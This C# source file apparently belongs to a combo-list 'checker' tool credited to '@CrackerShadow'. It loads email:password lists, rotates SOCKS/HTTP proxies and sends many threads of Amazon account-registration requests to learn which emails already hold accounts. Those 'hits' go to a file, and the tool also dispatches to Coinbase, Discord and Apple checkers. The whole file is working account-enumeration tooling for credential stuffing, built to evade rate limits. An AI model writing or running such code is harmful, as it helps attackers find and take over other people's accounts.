using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Web;
using System.Drawing;
using VM.VM;

namespace VM
{
    internal class Checker
    {
        public static int total;
        public static int api;
        public static int bad = 0;
        public static int hits = 0;
        public static int Custom = 0;
        public static int Flagged = 0;
        public static int err = 0;
        public static int retries = 0;
        public static int check = 0;
        public static List<string> ProxyList = new List<string>();
        public static string proxytype = "";
        public static int proxytotal = 0;
        public static int stop = 0;
        public static ConcurrentQueue<string> ComboQueue = new ConcurrentQueue<string>();
        public static List<string> Flag = new List<string>();
        public static int CPM = 0;
        public static int CPM_aux = 0;
        public static int threads;
        public static Random rnd = new Random();
        public static string show = "";
        public static string ib = "";
        public static int timeout = 0;

        private static void Amazon(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = Checker.timeout
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Checker.ProxyList.ElementAt<string>(new Random().Next(0, Checker.proxytotal)).Split(':', ';', '|');
                ProxyClient proxyClient = Checker.proxytype == "SOCKS5" ? (ProxyClient)new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (Checker.proxytype == "SOCKS4" ? (ProxyClient)new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1])));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                string str1 = Checker.RandomDigits(12);
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no - cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = true;
                string str2 = httpRequest.Get("").ToString();
                string ORT = betweenStrings(str2, "name=\"openid.return_to\" value=\"", "\" /><input type=\"hidden\" name=\"prevRID");
                string PRID = betweenStrings(str2, "name=\"siteState\" value=\"", "\" /><input type=\"hidden\" name=\"workflowState");
                string WFS = betweenStrings(str2, "name=\"workflowState\" value=\"", "\" /> <div id=\"ap_register_signin_form_table_wrapper");
                string AAT = betweenStrings(str2, "name=\"appActionToken\" value=\"", "\" />< input type = \"hidden\" name = \"appAction\" value = \"REGISTER");
                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                httpRequest.AddHeader("Cache-Control", "max-age=0");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("Host", "na.account.amazon.com");
                httpRequest.AddHeader("Origin", "");
                httpRequest.AddHeader("Referer", "");
                httpRequest.AddHeader("sec-ch-ua", "\"Google Chrome\"; v = \"89\", \"Chromium\"; v = \"89\", \";Not A Brand\"; v = \"99\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                string str3 = httpRequest.Post("", "appActionToken="+AAT+ "&appAction=REGISTER&openid.return_to="+ORT+ "&prevRID="+PRID+ "&workflowState="+WFS+ "&customerName=Json+Bear&email="+strArray1[0]+ "&emailCheck="+strArray1[0]+ "&password=UTN1Mg6L&passwordCheck=UTN1Mg6L&continue=Create+account&metadata1=", "application/x-www-form-urlencoded").ToString();
                if (str3.Contains("but an account already exists with the email address"))
                {
                    Interlocked.Increment(ref Checker.hits);
                    Interlocked.Increment(ref Checker.check);
                    Export.WriteToFileThreadSafe(combo, "..\\VM\\AMAZON_VM.txt");
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.LawnGreen);
                }
                if (str3.Contains("Solve this puzzle to protect your account"))
                {
                    Interlocked.Increment(ref Checker.check);
                    Interlocked.Increment(ref Checker.bad);
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.Red);
                }
            }
            catch 
            {
                Interlocked.Increment(ref Checker.err);
                Checker.ComboQueue.Enqueue(combo);
            }
        }


        public static void StartWorker(int threads)
        {
            ThreadPool.SetMinThreads(threads, threads);
            Thread[] threadArray = new Thread[threads];
            for (int index = 0; index < threads; ++index)
            {
                threadArray[index] = new Thread((ThreadStart)(() =>
                {
                    while (!Checker.ComboQueue.IsEmpty)
                    {
                        string result;
                        Checker.ComboQueue.TryDequeue(out result);
                        if (api == 1)
                        {
                            Checker.Amazon(result);
                        }
                        if (api == 2)
                        {
                            CoinBase.CB(result);
                        }
                        if(api == 3)
                        {
                            Discord_VM.disord(result);
                        }
                        if (api == 4)
                        {
                            Apple_VM.apple(result);
                        }
                    }
                }));
                threadArray[index].Start();
            }
            for (int index = 0; index < threads; ++index)
                threadArray[index].Join();
            Thread.Sleep(-1);
        }

        public static void StartTitle()
        {
            Task.Factory.StartNew((Action)(() =>
            {
                while (true)
                {
                    int check = Checker.check;
                    Thread.Sleep(3000);
                    Checker.CPM = (Checker.check - check) * 20;
                }
            }));
            Task.Factory.StartNew((Action)(() =>
            {
                while (true)
                {
                    Colorful.Console.Title = string.Format("Yahoo Checker Coded By @CrackerShadow Checked: {0}/{1} | Hits: {2} | 2FA : {3} | Flagged : {4} | Bad: {5} | Retries : {6} | Errors: {7} | CPM: ", (object)Checker.check, (object)Checker.total, (object)Checker.hits, (object)Checker.Custom, (object)Checker.Flagged, (object)Checker.bad, (object)Checker.retries, (object)Checker.err) + Checker.CPM.ToString() + " ] ";
                    Thread.Sleep(1000);
                }
            }));
        }

        public static string RandomDigits(int length)
        {
            Random random = new Random();
            string empty = string.Empty;
            for (int index = 0; index < length; ++index)
                empty += random.Next(10).ToString();
            return empty;
        }
        public static int falgger(string c1)
        {
            int count = Flag.Where(x => x.Equals(c1)).Count();
            return count;
        }
        public static String betweenStrings(String text, String start, String end)
        {
            int p1 = text.IndexOf(start) + start.Length;
            int p2 = text.IndexOf(end, p1);
            if (end == "") return (text.Substring(p1));
            else return text.Substring(p1, p2 - p1);
        }
    }
}
